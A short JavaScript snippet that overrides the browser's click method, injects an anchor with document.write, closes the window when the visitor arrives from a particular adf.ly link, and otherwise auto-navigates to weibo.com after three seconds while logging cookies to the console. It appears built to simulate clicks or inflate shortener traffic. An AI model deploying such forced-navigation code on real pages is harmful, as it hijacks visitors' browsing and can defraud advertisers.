function simulateClick(urllink){
	try {
		document.createElement('a');
		HTMLElement.prototype.click = function() {
			if (typeof this.onclick == 'function') {
				if (this.onclick({type: 'click'}) && this.href) 
					window.open(this.href, this.target ? this.target: '_self');
			} else if (this.href)
				window.open(this.href, this.target ? this.target: '_self');
		};
	} catch(e) {}
	document.write("<a href=" + urllink + " target=\"_self\" id=\"lzkwin\">welcome</a>");
	var myLink = document.getElementById("lzkwin");
	myLink.href = urllink;
	myLink.click();
}

$(document).ready(function(){
	if(document.referrer == "http://adf.ly/Vj1dG" ) {
		window.close();
		return;
	}
	var links = $("a[href]");
	var random = parseInt(Math.random() * links.length);
	var url = "http://weibo.com/";
	console.log(url);
	var delay = parseInt(Math.random()*20)*1000;
	delay=3*1000;
	setTimeout(function(){
		simulateClick(url);
	},delay);
	console.log(document.cookie);
	//setCookie('__utma','',-30) 
});
